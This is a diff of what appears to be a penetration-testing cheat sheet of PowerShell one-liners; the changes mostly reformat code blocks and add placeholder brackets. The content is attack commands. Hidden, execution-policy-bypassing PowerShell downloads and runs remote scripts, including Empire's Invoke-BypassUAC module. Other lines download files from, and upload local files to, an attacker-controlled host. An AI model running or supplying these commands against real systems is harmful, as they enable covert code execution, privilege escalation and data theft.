@@ -6,29 +6,28 @@ powershell.exe -Exec Bypass -NoP -NonI -W Hidden IEX(New-Object System.Net.WebCl
 
 #EXAMPLE
 powershell.exe -Exec Bypass -NoP -NonI -W Hidden IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'
-```
 
 # In PowerShell:
-```ps
 IEX((New-Object System.Net.WebClient).DownloadString('http://<LocalIPAddress>:<PORT>/FILE'))
 ```
 
 =========================================
-
 # Download File:
-powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).DownloadFile('http://LocalIPAddress:PORT/FILE', 'LOCAL_FILENAME')
+```ps
+powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).DownloadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LOCAL_FILENAME')
 
 # In PowerShell:
-(New-Object System.Net.WebClient).DownloadFile('http://LocalIPAddress:PORT/FILE', 'LOCAL_FILENAME')
-
+(New-Object System.Net.WebClient).DownloadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LOCAL_FILENAME')
+```
 
 =========================================
-
 # Upload File:
-powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).UploadFile('http://LocalIPAddress:PORT/FILE', 'LOCAL_FILENAME')
+```ps
+powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).UploadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LOCAL_FILENAME')
 
 # In PowerShell:
-(New-Object System.Net.WebClient).UploadFile('http://LocalIPAddress:PORT/FILE', 'LOCAL_FILENAME')
+(New-Object System.Net.WebClient).UploadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LOCAL_FILENAME')
+```
 
 ---------------
 # If you can't copy over SMB
